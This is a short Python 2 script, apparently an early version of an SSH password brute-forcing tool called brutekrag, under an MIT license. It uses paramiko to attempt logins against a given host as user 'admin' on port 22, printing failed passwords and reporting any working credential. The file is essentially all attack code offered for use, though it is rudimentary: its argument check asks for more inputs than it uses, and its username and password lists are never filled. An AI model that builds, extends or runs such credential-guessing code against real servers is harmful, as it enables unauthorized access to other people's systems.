"""
MIT License

Copyright (c) 2014 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import sys
import paramiko
from paramiko import AutoAddPolicy

banner = ('''\033[92m      _                _       _
     | |              | |     | |
     | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _
     | '_ \| '__| | | | __/ _ \ |/ / '__/ _` |/ _` |
     | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |
     |_.__/|_|   \__,_|\__\___|_|\_\_|  \__,_|\__, |
             \033[0m\033[1mOpenSSH Brute forcer tool 0.1\033[92m     __/ |
          \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m
          \n''')


class brutekrag:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.list_users = []
        self.list_passwords = []

    def connect(self, username, password):
        try:
            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(
                self.host,
                port=self.port,
                username=username,
                password=password
            )

        except paramiko.AuthenticationException, e1:
            print '%s password failed' % password
            client.close()
            return -1

        finally:
            client.close()

        print 'The password for user \033[1m%s\033[0m is \033[1m%s\033[0m' % (username, password)
        return 0


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print banner, 'args missing'
        sys.exit(1)

    hostname = sys.argv[1]
    password = sys.argv[2]

    username = 'admin'
    port = 22

    b = brutekrag(hostname, port)
    b.connect(username, password)
